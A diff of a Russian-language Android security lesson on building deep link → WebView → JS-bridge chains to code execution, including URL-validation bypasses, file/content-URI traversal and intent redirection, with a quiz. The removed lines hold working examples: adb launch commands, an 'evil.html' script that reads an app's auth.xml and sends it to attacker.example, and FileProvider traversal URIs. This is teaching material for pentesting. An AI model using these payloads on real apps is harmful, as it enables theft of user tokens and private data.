@@ -14,248 +14,185 @@ useful_for:
 estimated_minutes: 50
 summary: "Как deep link превращается в RCE: цепочки через WebView, file/content-URI, intent redirection и нативные мосты; полный разбор с командами и демонстрацией."
 ---
-## Введение
 
-Deep link сам по себе редко даёт RCE, но в цепочке с WebView, file-провайдерами и intent redirection он становится точкой входа для выполнения кода. Классические цепочки: deep link → `loadUrl` недоверенного URL → WebView с `addJavascriptInterface` → вызов нативных методов; или deep link → `file://`/`content://` → чтение/запись произвольных файлов; или deep link → intent redirection → запуск приватного компонента с привилегиями. Этот урок — про сборку таких цепочек и доказательство.
+## Вопрос, с которого всё начинается
 
-Требуется понимание `mobile-deeplink-deep` (ATO-цепочки) и `mobile-webview-deep` (WebView). Здесь — фокус на RCE-примитивах.
+Мы разобрали по отдельности deep links, WebView и JS-мосты. Но настоящая сила появляется, когда они складываются в **цепочку**: одна ссылка, которая через WebView доходит до моста и выполняет код. Как строится такая цепочка и как её искать?
 
-## Входы (sources)
+## Наш пример: цепочка от App Link до выполнения
 
-```bash
-# deep links и их параметры
-grep -rn "android:scheme\|android:host\|<data" src/AndroidManifest.xml
-# exported activity с обработкой url
-grep -rn "getIntent().getData\|Uri.parse\|getQueryParameter" src/smali*/ | head
-```
+Представим приложение, которое принимает App Link `https://app.example.com/web?url=...` и открывает переданный адрес во встроенном WebView. В приложении есть мост `Bridge.exec(cmd)`. Соберём атаку из трёх звеньев:
 
-Типичные входы: `myapp://open?url=...`, `myapp://webview?target=...`, App Links (`https://app.target.com/open`), QR/уведомления.
+1. **Вход (source):** App Link с параметром `url`.
+2. **Транспорт (gadget):** WebView грузит переданный URL.
+3. **Sink:** страница вызывает `Bridge.exec(...)`.
 
-## Передаточные звенья (gadgets)
+Каждое звено легитимно. Вместе — выполнение кода.
 
-- **WebView redirect**: `WebViewClient.shouldOverrideUrlLoading` возвращает `false` для внешних URL → загрузка attacker-страницы.
-- **`loadUrl` с недоверенными данными**: deep link-параметр попадает в `loadUrl` без валидации.
-- **`file://` / `content://`**: доступ к локальным файлам, `setAllowFileAccess(true)`.
-- **Intent redirection**: вложенный Intent из deep link-параметра.
-- **FileProvider**: `content://<pkg>.fileprovider/` с неограниченным `path`.
+## Шаг 1: источники (sources)
 
-## Sinks (RCE/данные)
+Источник — то, откуда приходит внешний ввод. Для цепочек RCE это:
 
-- **JS-bridge** (`@JavascriptInterface`) — вызов нативных методов из JS.
-- **`WebViewClient` + `addJavascriptInterface`** с опасными методами (файлы, exec).
-- **Нативные библиотеки** с командными операциями.
-- **Файловые операции** (запись в конфиг, `Runtime.exec`).
+- **Deep link / App Link** — параметры ссылки.
+- **Внешний URL**, загружаемый в WebView.
+- **Intent**, приходящий от другого приложения.
+- **Файл/контент**, который приложение открывает.
 
-## Полный сквозной пример: deep link → WebView → JS-bridge → RCE
+Задача — найти источник, значение которого доходит до опасной операции.
 
-Дано: `myapp://webview?url=` открывает WebView с `addJavascriptInterface`.
+## Шаг 2: звенья (gadgets)
 
-```bash
-# 1. Разведка deep link
-grep -rn "myapp" src/AndroidManifest.xml
-# -> <data android:scheme="myapp" android:host="webview"/>
-# 2. Проверяем загрузку внешнего URL
-adb shell am start -a android.intent.action.VIEW -d "myapp://webview?url=https://attacker.example/evil.html"
-# 3. На attacker-странице вызываем bridge
-```
+Между источником и sink стоят «передаточные звенья» — код, который переносит данные. Типичные:
 
-`evil.html`:
+- **Валидация URL по подстроке** — обходится хитрым URL.
+- **Редирект** — сервер приложения перенаправляет на внешний адрес.
+- **WebView**, грузящий переданный URL.
+- **Парсинг intent** и повторный `startActivity`.
 
-```html
-<script>
-  // если bridge экспонирован как 'native'
-  var r = native.readFile("/data/data/com.target.app/shared_prefs/auth.xml");
-  fetch("https://attacker.example/?d=" + encodeURIComponent(r));
-</script>
-```
+Каждое звено ослабляет защиту: даже если источник проверяется, слабое звено пропускает полезную нагрузку дальше.
 
-Если bridge позволяет выполнять команды/файловые операции — это RCE. Frida-хук для подтверждения bridge:
+## Шаг 3: sink — где происходит эффект
 
-```javascript
-Java.perform(function() {
-  var WV = Java.use("android.webkit.WebView");
-  WV.addJavascriptInterface.implementation = function(obj, name) {
-    console.log("[bridge] name=" + name + " class=" + obj.getClass().getName());
-    return this.addJavascriptInterface(obj, name);
-  };
-});
-```
+Sink — операция, дающая последствие:
 
-## Цепочка через file:// / content://
+- **Мост** (`addJavascriptInterface`) — вызов нативного метода.
+- **`Runtime.exec`/`ProcessBuilder`** — выполнение команды.
+- **`startActivity` с вложенным Intent** — запуск приватного компонента.
+- **Файловые операции** — чтение/запись по пути из ввода.
 
-```bash
-# deep link открывает локальный файл
-adb shell am start -a android.intent.action.VIEW -d "myapp://open?path=file:///data/data/com.target.app/shared_prefs/auth.xml"
-# или через content-провайдер
-adb shell am start -a android.intent.action.VIEW -d "myapp://open?path=content://com.target.app.fileprovider/../../../../data/data/com.target.app/databases/app.db"
-```
+Именно sink определяет severity. Мост, читающий токен, — high; мост, выполняющий команду, — critical.
 
-Если приложение грузит этот файл в WebView (`loadUrl("file://...")`) — возможен доступ к приватным данным, а при записи — подмена конфигов.
+## Шаг 4: обход валидации URL
 
-## Цепочка через intent redirection
+Ключевое звено часто — проверка URL. Типичные ошибки:
 
-```bash
-adb shell am start -a android.intent.action.VIEW \
-  -d "myapp://open?next=intent:#Intent;component=com.target.app/.PrivateExportService;end"
-```
+- `url.startsWith("https://trusted.com")` обходится `https://trusted.com.evil.com`.
+- `url.contains("trusted")` обходится `https://evil.com/?x=trusted`.
+- Проверка до нормализации: `%2e%2e`, разный регистр, `@` меняют хост.
 
-Если приложение берёт `next` из deep link и запускает — redirection (см. `mobile-intent-redirection`).
+Правильно — распарсить URL и сравнить `scheme` и `host` с белым списком. Если приложение проверяет строку целиком, обход почти гарантирован.
 
-## Методика
+## Шаг 5: цепочка через file:// / content://
 
-1. Перечислите все входы (deep links, App Links, exported-компоненты).
-2. Для каждого проследите данные до sink (WebView, bridge, файлы, Intent).
-3. Постройте PoC: `adb am start` с параметрами либо HTML-страница.
-4. Докажите влияние (чтение файла, RCE, ATO) и зафиксируйте шаги.
+Второй популярный маршрут — доступ к локальным данным. Если WebView разрешает `file://` и universal access, страница читает приватные файлы. Если разрешён `content://`, страница читает данные провайдеров. Цепочка: deep link задаёт URL → WebView грузит `file:///data/data/.../token.xml` → скрипт отправляет содержимое наружу.
 
-## Частые ошибки
+## Шаг 6: цепочка через intent redirection
 
-- **Тест только явного deep link**: App Links и неявные схемы тоже входы.
-- **Не проверить WebView-настройки**: `setJavaScriptEnabled`, `setAllowFileAccess`, `addJavascriptInterface`.
-- **Игнорировать FileProvider path**: неограниченный `path` — traversal.
-- **Забыть про intent redirection**: deep link-параметр как вложенный Intent.
-- **Не доказать влияние**: цепочка без результата — не находка.
-- **Только статика**: динамика (Frida/adb) подтверждает достижимость.
+Третий маршрут — запуск приватного компонента. Deep link передаёт вложенный Intent, приложение его парсит и вызывает `startActivity`. Атакующий открывает приватную Activity жертвы, которая недоступна напрямую. Если та Activity выполняет привилегированное действие, цепочка завершается.
 
-## Что дальше / решение
+## Шаг 7: как тестировать
 
-Соберите цепочку от входа к sink и докажите. Свяжите с `mobile-webview-jsbridge` (bridge abuse), `mobile-deeplink-deep` (ATO), `mobile-intent-redirection`. Рекомендация в отчёте: валидировать URL (whitelist), отключать небезопасные WebView-настройки, ограничивать FileProvider и не доверять deep link-параметрам.
+План:
 
-## Справочная таблица
+1. Собрать все источники: deep links, внешние URL, принимаемые Intent.
+2. Найти все sink: мосты, `exec`, `startActivity`, файловые операции.
+3. Проследить путь данных от источника к sink, отметив валидации.
+4. Попробовать обойти каждую валидацию.
+5. Собрать минимальный PoC: одна ссылка → эффект.
+6. Зафиксировать всю цепочку целиком.
 
-| Вход | Gadget | Sink |
-|------|--------|------|
-| myapp://webview?url= | loadUrl | JS-bridge |
-| myapp://open?path= | file:// | WebView/файл |
-| myapp://open?next= | intent redirect | приватный компонент |
-| App Link | shouldOverrideUrlLoading | внешний контент |
+## Разбор реального сценария
 
-| Проверка | Команда |
-|----------|---------|
-| Deep links | grep манифеста |
-| Запуск | `adb am start -a VIEW -d` |
-| Bridge | Frida addJavascriptInterface |
-| Навигация | Burp/логи WebView |
+Приложение принимает deep link `app://open?url=...`, проверяет URL по `startsWith("https://trusted.com")` и грузит его в WebView с мостом. Атакующий передаёт `https://trusted.com.evil.com/x`, проверка проходит (строка начинается с нужного префикса), а фактический хост — `evil.com`. Страница вызывает мост и выполняет действие. Здесь сломано ровно одно звено — проверка URL, — и вся цепочка становится рабочей. Это показывает, почему цепочки ищут по звеньям, а не по отдельным багам.
 
-## Сквозной кейс: от App Link до чтения приватного файла
+## Полный прогон от начала до конца
 
-Разберём цепочку целиком. Дано: приложение поддерживает App Link `https://app.target.com/open?file=`, экспортированную activity и WebView.
+Соберём цепочку в один сценарий. Сначала карта источников: deep links, внешние URL, принимаемые Intent. Затем карта sink: мосты, `exec`, `startActivity`, файловые операции. Дальше трассируем данные от источника к sink, отмечая каждую проверку. Пробуем обойти каждую (URL, тип, экранирование). Собираем минимальный PoC — одну ссылку, дающую эффект. Фиксируем всю цепочку целиком с шагами воспроизведения.
 
-Шаг первый — разведка входов. Смотрим манифест: находим `intent-filter` с `android:autoVerify="true"` и `<data android:host="app.target.com">`. Значит, ссылка открывает activity. Параметр `file` попадает в код. Ищем его обработку: `getQueryParameter("file")` → `Uri.parse` → `loadUrl`. Это gadget.
+## Частые вопросы
 
-Шаг второй — sink. В декомпилированном коде находим `loadUrl` с `setAllowFileAccess(true)`. Если параметр `file` не валидируется, можно загрузить `file:///data/data/com.target.app/...`. Но напрямую приватный путь недоступен из WebView чужого приложения — нужен обход через FileProvider.
+**«Обязательно ли нужны все три звена?»** — да, убери любое — цепочка не работает. **«Что если URL проверяется парсером?»** — тогда ищите другие звенья (редирект, file://). **«Нужен ли root?»** — нет. **«Как быстро найти sink?»** — grep по `addJavascriptInterface`, `Runtime.exec`, `startActivity`. **«Как оценить severity?»** — по sink: exec/мост — critical, чтение токена — high.
 
-Шаг третий — FileProvider. В манифесте находим `<provider android:name="androidx.core.content.FileProvider">` с `<root-path>` или широким `<paths>`. Если `path="."` или нет ограничений — traversal возможен. Формируем URI:
+## Практический совет
 
-```
-content://com.target.app.fileprovider/root/../../data/data/com.target.app/shared_prefs/auth.xml
-```
+Не ищите «один баг». Стройте граф: входы слева, sink справа, звенья между ними. Тогда вы видите, где разрыв в защите, и не тратите время на звенья, которые никуда не ведут. Ценность находки — в доказанной цепочке от ссылки до эффекта, а не в отдельном «интересном» фрагменте кода.
 
-Шаг четвертый — доставка. App Link `https://app.target.com/open?file=content://...` открывает WebView, который грузит файл. Если WebView выводит содержимое или передаёт его в мост — утечка.
+## Ещё один нюанс: редиректы на сервере
 
-Шаг пятый — подтверждение. Запускаем:
-
-```bash
-adb shell am start -a android.intent.action.VIEW \
-  -d "https://app.target.com/open?file=content://com.target.app.fileprovider/root/../../data/data/com.target.app/shared_prefs/auth.xml"
-```
-
-Наблюдаем содержимое prefs. Цепочка подтверждена.
-
-## Варианты sink для RCE
-
-Если WebView имеет мост с `readFile`/`exec`, traversal ведёт к RCE. Если есть `addJavascriptInterface`, внешняя страница вызывает нативные методы. Если deep link-параметр попадает в `Runtime.exec` или в нативный вызов — прямая команда. Всегда ищите путь от входа к нативному sink.
-
-## Обход валидации URL
-
-Частые обходы: `https://app.target.com.attacker.example/` (suffix), `https://app.target.com@attacker/` (userinfo), `https://attacker/?x=app.target.com` (contains), редирект с доверенного домена. Правильная проверка — парсинг и сверка `getHost()` по whitelist.
-
-## Методический чек-лист
-
-Перечислить входы (deep links, App Links, exported), для каждого проследить данные до sink (WebView, bridge, файлы, Intent, exec), построить PoC, подтвердить влияние, оформить. Проверять WebView-настройки, FileProvider paths, intent redirection, нативные мосты.
-
-## Рекомендации в отчёте
-
-Валидировать URL строго, не грузить `file://` из внешних параметров, ограничить FileProvider путями, отключить `setAllowFileAccess`, не экспонировать опасные методы моста, дублировать проверки на сервере. Цепочка deep link → RCE устраняется разрывом хотя бы одного звена — обычно валидацией URL и минимизацией моста.
-
-## Разбор через drozer и автоматизация
-
-Для цепочек удобно начать с `drozer`, который покажет все входы и их intent-filters. Команда `run app.activity.info -a <pkg>` даёт список activity с `exported` и `permission`, `run app.package.attacksurface` — сводку. Далее для каждого входа проверяем, как обрабатывается URL/extra: ищите `getIntent().getData()`, `getQueryParameter`, `getParcelableExtra` в декомпилированном коде. Комбинируя drozer (карта) и jadx (код), вы быстро находите пары «вход → sink».
-
-Автоматизация PoC: соберите скрипт, который перебирает входы и запускает их через `adb am start` с payload-ами, собирая результат в лог. Для каждого входа фиксируйте, открылся ли WebView, вызвался ли мост, прочитался ли файл. Так цепочки находятся системно, а не наугад.
-
-## Важные детали
-
-Проверяйте не только явные deep links, но и App Links (`autoVerify`), а также неявные intent-filters, делающие activity доступной. Учитывайте, что часть входов требует определённых extras, категорий или данных для достижения кода. В отчёте для каждой цепочки указывайте полный путь: вход, звенья, sink, влияние, шаги воспроизведения.
-
-## Фаззинг deep link-параметров
-
-Deep links — удобный вход для автоматического перебора параметров. Соберите список параметров (`url`, `target`, `next`, `file`, `path`, `redirect`, `token`) и payload-ов (внешний URL, `file://`, `content://`, `javascript:`, `intent:`). Прогоняйте через `adb am start -a android.intent.action.VIEW -d "<scheme>://<host>?<param>=<payload>"`, наблюдая logcat и сеть.
-
-Ищите: загрузку внешнего URL в WebView, запуск вложенного Intent, чтение файла, вызов моста. Каждый результат фиксируйте с точной командой. Для App Links используйте `https://` вместо схемы.
-
-## Проверка редиректов
-
-Если приложение грузит URL с доверенного домена, но тот имеет open redirect, можно уйти на attacker-страницу. Проверяйте цепочку: deep link → доверенный URL → редирект → внешний контент → sink. Это классическая многошаговая цепочка.
+Иногда звено — не в приложении, а на сервере. Ссылка `https://app.example.com/redirect?to=https://evil.com` заставляет сервер отдать 302 на внешний адрес, а WebView послушно грузит его. Тогда проверка URL в приложении может быть корректной (домен свой), но серверный редирект всё равно приводит к чужому контенту. Проверяйте открытые редиректы на бэкенде приложения — это часто недостающее звено цепочки.
 
 ## Итог
 
-Deep link-RCE находится фаззингом параметров и анализом обработки URL. Ключ — найти, где недоверенный параметр достигает WebView/файла/Intent без валидации. В отчёте покажите полную цепочку и рекомендации: whitelist URL, запрет `file://`, ограничение FileProvider, минимизация моста.
+Цепочка RCE — это не один баг, а путь. Ваша работа — нарисовать карту входов и sink, найти звено без защиты и провести данные насквозь. Даже слабое звено (проверка по подстроке, открытый редирект) в правильной цепочке даёт критический результат. Поэтому ищите пути, а не отдельные «интересные» строки кода.
 
-## Итоговый чек-лист deep link-RCE
+## Связь с другими уроками
 
-1. Соберите все входы: deep links, App Links, exported-компоненты, intent extras.
-2. Для каждого проследите данные до sink: WebView, JS-bridge, файловые операции, Intent, exec.
-3. Проверьте настройки WebView (`setJavaScriptEnabled`, `setAllowFileAccess`, `setAllowUniversalAccessFromFileURLs`).
-4. Проверьте FileProvider paths и intent redirection.
-5. Постройте PoC и подтвердите влияние (чтение файла, RCE, ATO).
-6. Оформите с полным путём цепочки и рекомендациями.
+Этот урок собирает воедино deep links, WebView и мосты. Все предыдущие темы — входы и звенья одной большой картины. Дальше мы вернёмся к компонентам и автоматизации, чтобы уметь находить такие цепочки не по одной, а системно, по всей поверхности приложения.
 
-Помните: разрыв любого звена (валидация URL, отключение файлового доступа, минимизация моста) обезвреживает цепочку. В отчёте укажите самое дешёвое исправление.
+## Ещё один нюанс: тип содержимого
+
+Иногда звено — не URL, а MIME-тип или имя файла. Приложение открывает «документ» по типу из Intent, и атакующий подсовывает тип, который приложение обработает небезопасно (например, HTML вместо текста). Проверяйте, как приложение определяет тип контента и доверяет ли он заявленному типу. Это ещё одно слабое звено между источником и sink.
+
+## Что мы теперь знаем
+
+По-простому:
+
+1. Цепочка RCE — это source → gadget → sink.
+2. Source — внешний ввод; gadget — перенос данных; sink — эффект.
+3. Валидация URL по подстроке — слабое звено, обходится.
+4. `file://`/`content://` и intent redirect — альтернативные маршруты.
+5. Severity определяется sink: exec/mост критичны, чтение токена — high.
+
+## На что смотреть дальше
+
+- **Составьте карту источников и sink** по коду.
+- **Проверяйте каждую валидацию** URL на обход.
+- **Ищите мосты и `exec`** — самые опасные sink.
+- **Стройте PoC целиком** — ценность в цепочке, не в звене.
+
+## Фаззинг deep link-параметров
+
+Параметры deep link удобно фаззить: подставляйте пустые значения, огромные строки, URL с разными схемами (`file`, `content`, `intent`, `javascript`) и смотрите, что изменится. Автоматизируйте перебор через `adb shell am start` в цикле и логируйте реакцию. Цель — найти параметр, который доходит до опасного sink, минуя проверки. Фаззинг не доказывает уязвимость, но быстро указывает на подозрительные входы.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Что чаще всего служит sink для RCE в deep link-цепочке?"
+- question: "Что такое sink в цепочке RCE?"
   options:
-    - "WebView JS-bridge (addJavascriptInterface)"
-    - "Manifest"
-    - "CA-сертификат"
-    - "Wi-Fi настройки"
+    - "Операция, дающая эффект (мост, exec, startActivity)"
+    - "Источник внешнего ввода"
+    - "Передаточное звено"
+    - "Сертификат"
   answer: 0
-- question: "Какая WebView-настройка открывает доступ к локальным файлам?"
+- question: "Какая проверка URL обходится `https://trusted.com.evil.com`?"
   options:
-    - "setAllowFileAccess(true)"
-    - "setJavaScriptEnabled(false)"
-    - "setBlockNetworkLoads(true)"
-    - "setSupportZoom(false)"
+    - "Проверка по `startsWith('https://trusted.com')`"
+    - "Сравнение scheme и host через парсер"
+    - "Белый список доменов"
+    - "Проверка после нормализации"
   answer: 0
-- question: "Как запустить deep link из adb?"
+- question: "Что определяет severity цепочки?"
   options:
-    - "am start -a android.intent.action.VIEW -d <uri>"
-    - "pm path"
-    - "content query"
-    - "fastboot flash"
+    - "Sink — какое действие выполняется"
+    - "Длина ссылки"
+    - "Версия Android"
+    - "Имя пакета"
   answer: 0
-- question: "Почему FileProvider с неограниченным path опасен?"
+- question: "Какой маршрут даёт доступ к приватным файлам через WebView?"
   options:
-    - "Позволяет path traversal к приватным файлам"
-    - "Ускоряет приложение"
-    - "Снимает подпись"
-    - "Отключает TLS"
+    - "file:// с universal access"
+    - "https без pinning"
+    - "market://"
+    - "ftp://"
   answer: 0
-- question: "Чем подтверждают достижимость цепочки?"
+- question: "Что нужно для цепочки через intent redirection?"
   options:
-    - "Динамикой (adb/Frida) и PoC с результатом"
-    - "Только статикой"
-    - "Только обфускацией"
-    - "Только подписью"
+    - "Приложение парсит вложенный Intent и вызывает startActivity"
+    - "Наличие TEE"
+    - "Root"
+    - "SQL-инъекция"
   answer: 0
 ```
 
+## Куда дальше
+
+Мы собрали цепочки от ссылки до выполнения. В следующем уроке вернёмся к компонентам и разберём **service hijacking**: перехват и эксплуатацию Android-сервисов. А пока запомни главное: ищите не отдельные баги, а путь от входа до опасной операции — именно цепочка даёт критическую находку.
+
 ## Где пригодится
 
-- **Пентест:** критические цепочки RCE.
-- **Bug bounty:** из «medium» в critical.
-- **Анализ малвари:** понимание атак.
-- **CTF:** Mobile-задачи на RCE.
+- **CTF Mobile:** построение цепочки до RCE.
+- **Bug bounty:** deep link → RCE — находка высшего уровня.
+- **Пентест:** системный поиск цепочек.
+- **Работа:** ревью архитектуры входов и sink.
